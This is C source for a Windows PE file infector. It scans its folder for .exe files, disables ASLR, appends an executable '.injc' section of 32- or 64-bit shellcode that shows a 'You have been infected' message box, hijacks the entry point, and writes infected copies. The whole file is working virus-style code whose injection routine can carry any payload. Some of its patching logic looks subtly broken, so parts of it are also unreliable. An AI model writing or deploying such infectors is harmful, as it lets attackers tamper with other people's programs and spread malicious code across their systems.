#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// 32-bit shellcode template: pushad; push uType; push lpCaption; push lpText; push hWnd; call MessageBoxA; popad; jmp to old OEP
static unsigned char shellcode32[] = {
    0x60,                   // pushad
    0x6A, 0x31,             // push MB_OK | MB_ICONWARNING
    0x68, 0,0,0,0,          // push offset caption (patched)
    0x68, 0,0,0,0,          // push offset text    (patched)
    0x6A, 0x00,             // push hWnd = NULL
    0xE8, 0,0,0,0,          // call MessageBoxA    (patched)
    0x61,                   // popad
    0xE9, 0,0,0,0           // jmp back to OEP     (patched)
};

// 64-bit shellcode template: xor rcx,rcx; lea rdx,[rip+txt]; lea r8,[rip+cap]; mov r9d,0x31; call MessageBoxA; jmp OEP
static unsigned char shellcode64[] = {
    0x48,0x31,0xC9,                         // xor rcx, rcx
    0x48,0x8D,0x15,0,0,0,0,                 // lea rdx, [rip+txt]  (patched)
    0x4C,0x8D,0x05,0,0,0,0,                 // lea r8,  [rip+cap]  (patched)
    0x41,0xB9,0x31,0x00,0x00,0x00,          // mov r9d, 0x31
    0xE8,0,0,0,0,                           // call MessageBoxA    (patched)
    0xE9,0,0,0,0                            // jmp back to OEP     (patched)
};

// Detects PE arch: returns 32 for PE32, 64 for PE64, 0 otherwise
int detect_pe_arch(const char* path) {
    FILE* f = fopen(path, "rb");
    if (!f) return 0;

    IMAGE_DOS_HEADER dos;
    if (fread(&dos, sizeof(dos), 1, f) != 1 || dos.e_magic != IMAGE_DOS_SIGNATURE) {
        fclose(f);
        return 0;
    }
    if (fseek(f, dos.e_lfanew, SEEK_SET) != 0) { fclose(f); return 0; }

    DWORD peSig;
    if (fread(&peSig, sizeof(peSig), 1, f) != 1 || peSig != IMAGE_NT_SIGNATURE) {
        fclose(f);
        return 0;
    }

    IMAGE_FILE_HEADER fh;
    if (fread(&fh, sizeof(fh), 1, f) != 1) { fclose(f); return 0; }

    WORD magic;
    if (fread(&magic, sizeof(magic), 1, f) != 1) { fclose(f); return 0; }
    fclose(f);

    if (magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) return 32;
    if (magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) return 64;
    return 0;
}

int inject_pe32(const char* targetPath) {
    // 1. Read file
    FILE* f = fopen(targetPath, "rb");
    if (!f) { fprintf(stderr, "Cannot open %s\n", targetPath); return 1; }
    fseek(f, 0, SEEK_END);
    long fileSize = ftell(f);
    fseek(f, 0, SEEK_SET);
    BYTE* buffer = malloc(fileSize);
    if (!buffer) { fprintf(stderr, "Memory alloc failed\n"); fclose(f); return 1; }
    fread(buffer, 1, fileSize, f);
    fclose(f);

    // 2. Parse headers
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)buffer;
    IMAGE_NT_HEADERS* nt  = (IMAGE_NT_HEADERS*)(buffer + dos->e_lfanew);
    IMAGE_FILE_HEADER* fh = &nt->FileHeader;
    IMAGE_OPTIONAL_HEADER* oh = &nt->OptionalHeader;

    if (oh->Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        fprintf(stderr, "%s is not a 32-bit PE\n", targetPath);
        free(buffer);
        return 1;
    }

    // Disable ASLR
    oh->DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;

    DWORD oldOEP    = oh->AddressOfEntryPoint;
    DWORD imageBase = oh->ImageBase;

    // 3. Locate last section
    IMAGE_SECTION_HEADER* secs = (IMAGE_SECTION_HEADER*)((BYTE*)&nt->OptionalHeader + fh->SizeOfOptionalHeader);
    IMAGE_SECTION_HEADER* last = &secs[fh->NumberOfSections - 1];

    DWORD fileAlign = oh->FileAlignment;
    DWORD secAlign  = oh->SectionAlignment;
    DWORD shellSize = sizeof(shellcode32);

    DWORD newVA  = ((last->VirtualAddress + last->Misc.VirtualSize + secAlign - 1) / secAlign) * secAlign;
    DWORD newRaw = ((last->PointerToRawData  + last->SizeOfRawData  + fileAlign  - 1) / fileAlign ) * fileAlign;

    // Strings
    const char* cap = "Alert";
    const char* txt = "You have been infected";
    DWORD capLen = (DWORD)strlen(cap) + 1;
    DWORD txtLen = (DWORD)strlen(txt) + 1;

    // 4. Create new section header
    IMAGE_SECTION_HEADER ns = {0};
    memcpy(ns.Name, ".injc", 5);
    ns.VirtualAddress   = newVA;
    ns.Misc.VirtualSize = shellSize + capLen + txtLen;
    ns.PointerToRawData = newRaw;
    ns.SizeOfRawData    = ((ns.Misc.VirtualSize + fileAlign - 1) / fileAlign) * fileAlign;
    ns.Characteristics  = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE |
                          IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;

    // 5. Expand buffer & reparse
    buffer = realloc(buffer, newRaw + ns.SizeOfRawData);
    dos    = (IMAGE_DOS_HEADER*)buffer;
    nt     = (IMAGE_NT_HEADERS*)(buffer + dos->e_lfanew);
    fh     = &nt->FileHeader;
    oh     = &nt->OptionalHeader;
    secs   = (IMAGE_SECTION_HEADER*)((BYTE*)&nt->OptionalHeader + fh->SizeOfOptionalHeader);

    // Insert the new section
    secs[fh->NumberOfSections] = ns;
    fh->NumberOfSections++;
    oh->SizeOfImage = newVA + ns.SizeOfRawData;

    // 6. Copy shellcode + strings
    BYTE* data = buffer + newRaw;
    DWORD offsCap = shellSize;
    DWORD offsTxt = offsCap + capLen;
    memcpy(data, shellcode32, shellSize);
    memcpy(data + offsCap, cap, capLen);
    memcpy(data + offsTxt, txt, txtLen);

    // 7. Patch shellcode
    #define PATCH4(addr, val) (*(DWORD*)(addr) = (DWORD)(val))
    // patch caption & text offsets
    PATCH4(data + 4, newVA + offsCap);
    PATCH4(data + 9, newVA + offsTxt);
    // patch call and jmp
    for (DWORD i = 0; i < shellSize - 5; i++) {
        if (data[i] == 0xE8) { // call
            DWORD callAddr = imageBase + newVA + i;
            DWORD msgAddr  = (DWORD)GetProcAddress(GetModuleHandleA("user32.dll"), "MessageBoxA");
            DWORD delta    = msgAddr - (callAddr + 5);
            PATCH4(data + i + 1, delta);
        }
        else if (data[i] == 0xE9) { // jmp
            DWORD jmpAddr = imageBase + newVA + i;
            DWORD rel     = (imageBase + oldOEP) - (jmpAddr + 5);
            PATCH4(data + i + 1, rel);
            break;
        }
    }
    #undef PATCH4

    // 8. Redirect entry point
    oh->AddressOfEntryPoint = newVA;

    // 9. Write out
    char outPath[MAX_PATH];
    snprintf(outPath, MAX_PATH, "%s.infected.exe", targetPath);
    FILE* o = fopen(outPath, "wb");
    if (!o) { fprintf(stderr, "Cannot write %s\n", outPath); free(buffer); return 1; }
    fwrite(buffer, 1, newRaw + ns.SizeOfRawData, o);
    fclose(o);
    free(buffer);

    printf("Injected 32-bit -> %s\n", outPath);
    return 0;
}

int inject_pe64(const char* targetPath) {
    // 1. Read file
    FILE* f = fopen(targetPath, "rb");
    if (!f) { fprintf(stderr, "Cannot open %s\n", targetPath); return 1; }
    fseek(f, 0, SEEK_END);
    long fileSize = ftell(f);
    fseek(f, 0, SEEK_SET);
    BYTE* buffer = malloc(fileSize);
    if (!buffer) { fprintf(stderr, "Memory alloc failed\n"); fclose(f); return 1; }
    fread(buffer, 1, fileSize, f);
    fclose(f);

    // 2. Parse headers
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)buffer;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(buffer + dos->e_lfanew);
    IMAGE_FILE_HEADER* fh = &nt->FileHeader;
    IMAGE_OPTIONAL_HEADER64* oh = &nt->OptionalHeader;

    if (oh->Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        fprintf(stderr, "%s is not a 64-bit PE\n", targetPath);
        free(buffer);
        return 1;
    }

    // Disable ASLR
    oh->DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;

    DWORD oldOEP    = oh->AddressOfEntryPoint;
    ULONGLONG imageBase = oh->ImageBase;

    // 3. Locate last section
    IMAGE_SECTION_HEADER* secs = (IMAGE_SECTION_HEADER*)((BYTE*)&nt->OptionalHeader + fh->SizeOfOptionalHeader);
    IMAGE_SECTION_HEADER* last = &secs[fh->NumberOfSections - 1];

    DWORD fileAlign = oh->FileAlignment;
    DWORD secAlign  = oh->SectionAlignment;
    DWORD shellSize = sizeof(shellcode64);

    DWORD newVA  = (DWORD)(((last->VirtualAddress + last->Misc.VirtualSize + secAlign - 1) / secAlign) * secAlign);
    DWORD newRaw = (DWORD)(((last->PointerToRawData  + last->SizeOfRawData  + fileAlign - 1) / fileAlign ) * fileAlign);

    // Strings
    const char* cap = "Alert";
    const char* txt = "You have been infected";
    DWORD capLen = (DWORD)strlen(cap) + 1;
    DWORD txtLen = (DWORD)strlen(txt) + 1;

    // 4. Create new section
    IMAGE_SECTION_HEADER ns = {0};
    memcpy(ns.Name, ".injc", 5);
    ns.VirtualAddress   = newVA;
    ns.Misc.VirtualSize = shellSize + capLen + txtLen;
    ns.PointerToRawData = newRaw;
    ns.SizeOfRawData    = ((ns.Misc.VirtualSize + fileAlign - 1) / fileAlign) * fileAlign;
    ns.Characteristics  = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE |
                          IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;

    // 5. Expand buffer & reparse
    buffer = realloc(buffer, newRaw + ns.SizeOfRawData);
    dos  = (IMAGE_DOS_HEADER*)buffer;
    nt   = (IMAGE_NT_HEADERS64*)(buffer + dos->e_lfanew);
    fh   = &nt->FileHeader;
    oh   = &nt->OptionalHeader;
    secs = (IMAGE_SECTION_HEADER*)((BYTE*)&nt->OptionalHeader + fh->SizeOfOptionalHeader);

    // Insert section
    secs[fh->NumberOfSections] = ns;
    fh->NumberOfSections++;
    oh->SizeOfImage = newVA + ns.SizeOfRawData;

    // 6. Copy shellcode + strings
    BYTE* data = buffer + newRaw;
    DWORD offsCap = shellSize;
    DWORD offsTxt = offsCap + capLen;
    memcpy(data, shellcode64, shellSize);
    memcpy(data + offsCap, cap, capLen);
    memcpy(data + offsTxt, txt, txtLen);

    // 7. Patch shellcode
    #define PATCH32(ptr,val) (*(DWORD*)(ptr) = (DWORD)(val))
    // lea rdx,[rip+txt]
    PATCH32(data + 5,  (DWORD)(newVA + offsTxt - (newVA + 5 + 4)));
    // lea r8,[rip+cap]
    PATCH32(data + 12, (DWORD)(newVA + offsCap - (newVA + 12 + 4)));
    // call MessageBoxA
    {
        DWORD callSite = newVA + 19; 
        DWORD msgAddr  = (DWORD)GetProcAddress(GetModuleHandleA("user32.dll"), "MessageBoxA");
        DWORD rel      = msgAddr - (DWORD)(imageBase + callSite + 5);
        PATCH32(data + 20, rel);
    }
    // jmp back to OEP
    {
        DWORD jmpSite = newVA + 24;
        DWORD rel     = (DWORD)((ULONGLONG)oldOEP - (jmpSite + 5));
        PATCH32(data + 25, rel);
    }
    #undef PATCH32

    // 8. Redirect entry point
    oh->AddressOfEntryPoint = newVA;

    // 9. Write out
    char outPath[MAX_PATH];
    snprintf(outPath, MAX_PATH, "%s.infected.exe", targetPath);
    FILE* o = fopen(outPath, "wb");
    if (!o) { fprintf(stderr, "Cannot write %s\n", outPath); free(buffer); return 1; }
    fwrite(buffer, 1, newRaw + ns.SizeOfRawData, o);
    fclose(o);
    free(buffer);

    printf("Injected 64-bit -> %s\n", outPath);
    return 0;
}

int main(void) {
    // Determine our own filename & folder
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);

    char folder[MAX_PATH], selfName[MAX_PATH];
    char* lastSlash = strrchr(selfPath, '\\');
    if (lastSlash) {
        size_t dirLen = lastSlash - selfPath;
        strncpy(folder, selfPath, dirLen);
        folder[dirLen] = '\0';
        strcpy(selfName, lastSlash + 1);
    } else {
        strcpy(folder, ".");
        strcpy(selfName, selfPath);
    }

    // Enumerate EXEs in folder
    char searchPattern[MAX_PATH];
    snprintf(searchPattern, MAX_PATH, "%s\\*.exe", folder);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(searchPattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("No .exe files found in %s\n", folder);
        return 0;
    }

    do {
        // skip directories and the injector itself
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
            _stricmp(fd.cFileName, selfName) != 0)
        {
            char fullPath[MAX_PATH];
            snprintf(fullPath, MAX_PATH, "%s\\%s", folder, fd.cFileName);

            int arch = detect_pe_arch(fullPath);
            if (arch == 32) {
                printf("-> Injecting 32-bit: %s\n", fd.cFileName);
                inject_pe32(fullPath);
            }
            else if (arch == 64) {
                printf("-> Injecting 64-bit: %s\n", fd.cFileName);
                inject_pe64(fullPath);
            }
            else {
                printf("-> Skipping non-PE or unsupported: %s\n", fd.cFileName);
            }
        }
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);

    return 0;
}
